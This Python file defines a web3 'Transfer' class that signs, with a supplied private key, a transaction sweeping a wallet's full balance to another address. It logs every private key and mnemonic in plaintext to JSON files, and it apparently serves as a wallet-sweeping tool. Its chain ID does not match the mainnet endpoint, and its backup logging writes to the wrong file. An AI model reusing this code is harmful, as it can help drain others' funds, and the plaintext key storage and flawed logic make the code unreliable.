import os
import json
from web3 import Web3

from eth_utils import (
    is_checksum_address,
)


class Transfer:
    def __init__(self, apiKey=None, apiURL="https://mainnet.infura.io/v3", logFile="wallets.json", apiType="https://"):
        self.apiURL = apiURL
        self.apiKey = apiKey
        self.apiType = apiType
        self.directory = os.path.dirname(os.path.abspath(__file__))
        self.logFile = os.path.join(self.directory, logFile)
        self.backupFile = os.path.join(self.directory, "backup.json")
        self.w3 = self.init_infura()

    def sumcheck_address(self, rec_address, from_address):
        return is_checksum_address(rec_address) and is_checksum_address(from_address)

    def log_wallet(self, logFile, data, status):
        try:
            with open(logFile, "r") as file:
                data_json = json.load(file)

            data_json.append({
                "rec_address": data['rec_address'],
                "from_address": data['from_address'],
                "balance": data['balance'],
                "private_Key": data['private'],
                "mnemonic": data['mnemonic'],
                "status": status
            })

            with open(self.logFile, 'w') as file:
                json.dump(data_json, file)

            return True
        except Exception as e:
            print(e)
            return False

    def init_infura(self):
        apiURL = f'{self.apiType}{self.apiURL}' if not self.apiKey else f'{self.apiType}{self.apiURL}/{self.apiKey}'
        if self.apiType == "wss://":
            return Web3(Web3.WebsocketProvider(apiURL))
        elif self.apiType == "http://" or self.apiType == "https://":
            return Web3(Web3.HTTPProvider(apiURL))

    def tx_eth(self, data):
        nonce = self.w3.eth.get_transaction_count(data['from_address'])
        tx = {
            'type': '0x2',
            'nonce': nonce,
            'from': data['from_address'],
            'to': data['rec_address'],
            'value': int(data['balance']),
            'maxFeePerGas': self.w3.to_wei('250', 'gwei'),
            'chainId': 137
        }

        gas = self.w3.eth.estimate_gas(tx)
        priorityFee = self.w3.eth.max_priority_fee

        tx['gas'] = gas
        tx['maxPriorityFeePerGas'] = priorityFee

        return tx

    def transfer(self, data):
        try:
            log = self.log_wallet(self.backupFile, data, None)
            if self.sumcheck_address(data['rec_address'], data['from_address']):
                tx = self.tx_eth(data)
                signed_tx = self.w3.eth.account.sign_transaction(
                    tx, data['private'])
                tx_hash = self.w3.eth.send_raw_transaction(
                    signed_tx.rawTransaction)
                log = self.log_wallet(self.logFile, data, True)
                if not log:
                    return {
                        "status": True,
                        "message": "save_error",
                        "tx_hash": tx_hash
                    }
                return {
                    "status": True,
                    "message": "eth_move",
                    "tx_hash": tx_hash
                }
            return {
                "status": False,
                "message": "sumcheck_fail"
            }
        except Exception as e:
            return {
                "status": False,
                "message": "transfer_error",
                "err": e
            }
